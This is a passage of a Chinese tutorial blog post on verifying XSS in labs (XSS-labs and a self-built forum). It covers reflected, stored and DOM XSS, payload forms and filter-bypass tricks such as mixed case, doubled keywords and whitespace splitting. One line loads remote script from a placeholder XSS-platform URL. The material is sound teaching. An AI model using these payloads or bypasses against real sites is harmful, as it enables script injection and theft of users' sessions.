    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="1-漏洞验证相关概念"><a href="#1-漏洞验证相关概念" class="headerlink" title="1 漏洞验证相关概念"></a>1 漏洞验证相关概念</h2><p>1.常见概念<br>    POC：全称 ’ Proof of Concept ‘，中文 ’ 概念验证 ’ ，常指一段漏洞证明的代码。<br>    EXP：全称 ’ Exploit ‘，中文 ’ 利用 ‘，指利用系统漏洞进行攻击的动作。<br>    Payload：中文 ’ 有效载荷 ‘，指成功exploit之后，真正在目标系统执行的代码或指令。<br>    Shellcode：简单翻译 ’ shell代码 ‘，是Payload的一种。Shellcode也有很多种，包括正向的，反向                        的，甚至meterpreter。<br>2.POC与EXP对比<br>    POC是用来证明漏洞存在的，EXP是用来利用漏洞的，两者通常不是一类，或者说，PoC通常是无害    的，Exp通常是有害的，有了POC，才有EXP。<br>3.Payload与Shellcode<br>    Payload有很多种，它可以是Shellcode，也可以直接是一段系统命令。<br>4.Payload与EXP<br>    同一个Payload可以用于多个漏洞，但每个漏洞都有其自己的EXP，也就是说不存在通用的EXP。<br>5.Payload模块<br>    在Metasploit Framework 6大模块中有一个Payload模块，在该模块下有Single、Stager、Stages这    三种类型，Single是一个all-in-one的Payload，不依赖其他的文件，所以它的体积会比较大，Stager    主要用于当目标计算机的内存有限时，可以先传输一个较小的Stager用于建立连接，Stages指利用S    tager建立的连接下载后续的Payload。Stager和Stages都有多种类型，适用于不同场景。</p><h2 id="2-XSS漏洞验证"><a href="#2-XSS漏洞验证" class="headerlink" title="2 XSS漏洞验证"></a>2 XSS漏洞验证</h2><p>2.1 常见POC<br>可以用一段简单的代码（POC）来验证与检查漏洞的存在，常见的用于验证XSS漏洞存在的POC如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">prompt</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-2-反射型XSS漏洞验证"><a href="#2-2-反射型XSS漏洞验证" class="headerlink" title="2.2 反射型XSS漏洞验证"></a>2.2 反射型XSS漏洞验证</h4><p>1.反射型XSS漏洞常存在于参数中。本实验在XSS-labs第一关做验证，点击网站直接开战：<a href="http://test.ctf8.com/level1.php?name=test">http://test.ctf8.com/level1.php?name=test</a></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a3dfa130bdf7aec647e41cf1c368fcd9.png" alt="在这里插入图片描述"></p><p>我们将URL中的参数修改为?name=111回车，可以看到弹出以下页面，并我们的内容显示在页面上，后续我们将测试此处是否存在反射型XSS漏洞。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/6431d4d7f1005b1b62555821175cd6ae.png" alt="在这里插入图片描述"></p><p>我们将参数修改为?name=<script>alert(/xss/)</script>，测试是否触发弹窗。回车可以看到弹出窗口，说明网站后台未对输入参数进行过滤，存在漏洞。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/c1f0ce03f14a350c61a069dc9b7fa20a.png" alt="在这里插入图片描述"></p><p>我们右键网页，点击查看源码，如下。由于该网页没有对输入输出内容做任何的检验与过滤，导致这种异常</p><p>的内容输出到客户端浏览器，浏览器对内容做解析时，将内容按script标签进行解析，故弹窗。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level2.php?keyword=test&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">style</span>=<span class="string">&quot;border:0px&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/x-scriptlet&quot;</span> <span class="attr">data</span>=<span class="string">&quot;http://xss.tv/themes/default/templates/head.html&quot;</span> <span class="attr">width</span>=<span class="string">100%</span> <span class="attr">height</span>=<span class="string">50</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎用户<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alear</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level1.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>payload的长度:29<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">​```</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level2.php?keyword=test&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">style</span>=<span class="string">&quot;border:0px&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/x-scriptlet&quot;</span> <span class="attr">data</span>=<span class="string">&quot;http://xss.tv/themes/default/templates/head.html&quot;</span> <span class="attr">width</span>=<span class="string">100%</span> <span class="attr">height</span>=<span class="string">50</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎用户<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alear</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level1.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>payload的长度:29<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-3-存储型XSS漏洞验证"><a href="#2-3-存储型XSS漏洞验证" class="headerlink" title="2.3 存储型XSS漏洞验证"></a>2.3 存储型XSS漏洞验证</h4><p>1.存储型XSS漏洞常存在于数据库内容中，如留言板等。此处利用之前搭建的论坛网站的留言功能作为实验平台，该平台的搭建过程参考《搭建一个简单丑陋的论坛网站》。</p><p>2.我们登录访问该网站，使用我们之前住过的账号a，密码也是a。登录后返回首页，点击“我要留言”。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b39581d616897a54fe045a63b9657578.png" alt="在这里插入图片描述"></p><p>3.使用留言功能，留下如下的内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>。点击提交</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/dc42c41f2f5ffcec651230c24bd4b392.png" alt="在这里插入图片描述"></p><p>4.再次返回首页，可以看到刚刚留下的留言。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/bda571b91a1247a35e7903c73f71b401.png" alt="在这里插入图片描述"></p><p>5.点击该留言，出现弹窗，这就是存储型XSS漏洞。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/eee6bfe2aa0150f1831e2a24541e3f95.png" alt="在这里插入图片描述"></p><p>6.右键该页面，查看网页源码，如下.我们看到因为我们搭建的平台没有对输入输出内容做任何的检验与过滤，导致这种异常的内容输出到客户端浏览器，浏览器对内容做解析时，将内容按script标签进行解析，故弹窗。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span> = <span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>留言论坛<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>留言内容<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">&#x27;../index.php&#x27;</span>&gt;</span>返回首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span><br><span class="line">作者：a<span class="tag">&lt;<span class="name">br</span>&gt;</span>标题：存储型XSS<span class="tag">&lt;<span class="name">hr</span> /&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-4-DOM型XSS漏洞验证"><a href="#2-4-DOM型XSS漏洞验证" class="headerlink" title="2.4 DOM型XSS漏洞验证"></a>2.4 DOM型XSS漏洞验证</h4><p>1.暂时没有找到什么平台适合测试，就找到了一段代码，我们将其存在phpstudy网站的根目录下的dom.php文件中，稍后进行测试。该代码中的script标签内的内容意思是，定义一个变量a并赋值为URL，为a解码，将message=后面的内容写入到DOM树中。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM-XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span>&gt;</span>charset=&quot;utf-8&quot;&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">heaf</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> a = <span class="variable language_">document</span>.<span class="property">URL</span>;</span></span><br><span class="line"><span class="language-javascript">a = <span class="built_in">unescape</span>(a);</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(a.<span class="title function_">substring</span>(a.<span class="title function_">indexOf</span>(<span class="string">&quot;message=&quot;</span>)+<span class="number">8</span>,a.<span class="property">length</span>));</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bofy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2.我们通过浏览器访问该网页，因为我们还没有给URL传递参数message，此处将内容以存文本的形式输出。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5a50997dbfd1b77fe59c2e513d4e20af.png" alt="在这里插入图片描述"></p><p>3.修改参数为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>，回车时则出现弹窗。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/545abeca38ac665bd35dc4d4030b8a2f.png" alt="在这里插入图片描述"></p><p>4.我们右键查看源代码，发现代码与刚刚编写的一致，并没有弹窗的内容。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/873507b95133cffa23e7e8c2c7022087.png" alt="在这里插入图片描述"></p><p>5.审查网页元素，则可以看到DOM树这里多出了个弹窗内容，就是上述document语句修改生成的。（有的浏览器查看结果有区别，可以试试不同浏览器的解析结果）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/36c018381f067a48d5a2457d4e30fd07.png" alt="在这里插入图片描述"></p><h2 id="3-XSS语句构造与绕过"><a href="#3-XSS语句构造与绕过" class="headerlink" title="3 XSS语句构造与绕过"></a>3 XSS语句构造与绕过</h2><h4 id="3-1-XSS语句构造方式"><a href="#3-1-XSS语句构造方式" class="headerlink" title="3.1 XSS语句构造方式"></a>3.1 XSS语句构造方式</h4><p>第一种：可以利用[&lt;&gt;]构造HTML/JS语句，如</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">prompt</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>第二种：可以利用javascript:伪协议的方式构造XSS。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">a</span> href=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;touch me&lt;/a&gt; <span class="comment">//利用a标签的javascript:伪协议</span></span><br><span class="line">&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span> &gt; //利用img标签的javascript:伪协议，但是这种方式在IE6下测试成功，在IE8失败</span><br><span class="line">javascript:$<span class="selector-class">.getScript</span>(<span class="string">&quot;XSS平台接收网址&quot;</span>)   <span class="comment">//jQuery 的 $.getScript() 函数用来异步加载并执行来自 xss平台 的 js 脚本，使用前提是网站引用了jQuery。</span></span><br></pre></td></tr></table></figure><p>第三种：事件驱动：事件驱动是一种比较经典的编程思想。在网页内会发生很多事件（比如鼠标移动，键盘输入等），JS可以对此类事件进行响应，因此我们可以通过事件触发JS函数，触发XSS。事件种类主要有以下几种。<br>1.Windows事件：对Windows对象触发的事件；<br>2.Form事件：HTML表单内的动作触发事件；<br>3.keyboard事件：键盘按键；<br>4.Mouse事件：有鼠标或类似用户动作触发的事件；<br>5.Media事件：由多媒体触发的事件。</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&#x27;./smile.jpg&#x27;</span> onmouseover=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;<span class="comment">//该标签会引入一张图片，然后鼠标悬停在图片上的时候，会触发XSS代码。</span></span><br><span class="line">&lt;img src=<span class="string">&#x27;./smile.jpg&#x27;</span> <span class="keyword">onerror</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;<span class="comment">//onerror会在文档载入失败时触发XSS，比如下一个语句</span></span><br><span class="line">&lt;img src=<span class="string">&#x27;#&#x27;</span> <span class="keyword">onerror</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;<span class="comment">//与上一个语句相比，将文件路径改成#，一定载入失败，触发XSS</span></span><br><span class="line">&lt;<span class="keyword">input</span> type=<span class="string">&quot;text&quot;</span> onkeydown=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;<span class="comment">//单行文本框的键盘点击事件，当点击键盘任一按键时触发XSS。</span></span><br><span class="line">&lt;<span class="keyword">input</span> type=<span class="string">&quot;text&quot;</span> onkeyup=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> type=<span class="string">&quot;button&quot;</span> <span class="keyword">onclick</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>第四种：是利用CSS（层叠样式脚本）触发XSS的，该方法比较古老，现已基本不适用于主流浏览器，以下代码均在IE6下进行测试。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// 行内样式</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span> = <span class="string">&quot;backgroud-image:url(javascript:alert(/xss/))&quot;</span>&gt;</span></span><br><span class="line">//页内样式</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="selector-tag">Body</span>&#123;backgroud-<span class="selector-tag">image</span>:<span class="built_in">url</span>(<span class="string">javascript:alert(/xss/</span>))&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">//外部样式</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./xss.css&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span>hello<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">//其中xss.css文本内容如下</span><br><span class="line">h1 &#123;color:red;&#125;</span><br><span class="line">div&#123;</span><br><span class="line">/*width:expression(alert(/xss/))*/</span><br><span class="line">backgroud-image:url(javascript:alert(/xss/))</span><br><span class="line">&#125;</span><br><span class="line">@ expression</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:expression(alert(/xss/))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="selector-tag">Body</span>&#123;backgroud-<span class="selector-tag">image</span>:<span class="built_in">expression</span>(<span class="built_in">alert</span>(/xss/));&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">@import</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="keyword">@import</span> <span class="string">&#x27;javascript:alert(&quot;xss&quot;)&#x27;</span>;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"><span class="keyword">@import</span> url(xss.css);</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span>HELLO<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>5.其他标签及手法，利用一些比较新的前端标签进行构造。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg <span class="attribute">onload</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span><br><span class="line">&lt;input <span class="attribute">onfocus</span>=alert(xss/) autofocus&gt;</span><br></pre></td></tr></table></figure><h4 id="3-2-变形及绕过方式"><a href="#3-2-变形及绕过方式" class="headerlink" title="3.2 变形及绕过方式"></a>3.2 变形及绕过方式</h4><p>0.目的：我们可以将构造的XSS代码进行各种变形，以绕过XSS过滤器检测。<br>第一种：大小写混编<br>可以将payload进行大小写混编，如以下例子。例子中包含两种语言，其中html语言对大小写不敏感，也就是说无论是大小写，该语言都认为是同一个函数；但是JS语言对大小写敏感，比如alert()函数，如果改为Alert()，JS语言则认为是另一个东西。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Img</span> <span class="attr">Src</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">Onerror</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;</span>//由<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">οnerrοr</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;</span>变形得到的</span><br><span class="line"><span class="tag">&lt;<span class="name">A</span> <span class="attr">Href</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span>touch me<span class="tag">&lt;/<span class="name">a</span>&gt;</span>//由<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span>touch me<span class="tag">&lt;/<span class="name">a</span>&gt;</span>变形得到的</span><br></pre></td></tr></table></figure><p>第二种：双写绕过。当发现过滤器仅进行一次过滤时并将一些关键字过滤为空，则可以使用双写绕过。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">ipt&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)&lt;/scr</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>ipt&gt;</span><br></pre></td></tr></table></figure><p>第三种：引号的使用<br>HTML语言中对引号的使用不敏感，但是有些过滤函数则对引号时锱铢必较的，因此我们可以使用不同引号来闭合XSS语句。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//以下三种均可能成功触发XSS，具体能否注入就看过滤是如何过滤的了。</span></span><br><span class="line">&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="string">&quot;#&quot;</span> onerror=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span><br><span class="line">&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="string">&#x27;#&#x27;</span> onerror=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;</span><br><span class="line">&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=# onerror=<span class="built_in">alert</span>(/xss/)&gt;</span><br></pre></td></tr></table></figure><p>第四种：使用 [/]或者/**/ 代替空格，如：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=&#x27;#&#x27;/onerror=&#x27;alert(<span class="name">/xss/</span>)&#x27;&gt;</span><br></pre></td></tr></table></figure><p>第五种：在一些关键字内，可以插入回车符与Tab符来绕过关键字检测。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;</span>//有时候tab符插在关键字内会失效。</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;ja</span></span></span><br><span class="line"><span class="string"><span class="tag">vascript:alert(/xss/)&quot;</span>&gt;</span>touch me<span class="tag">&lt;/<span 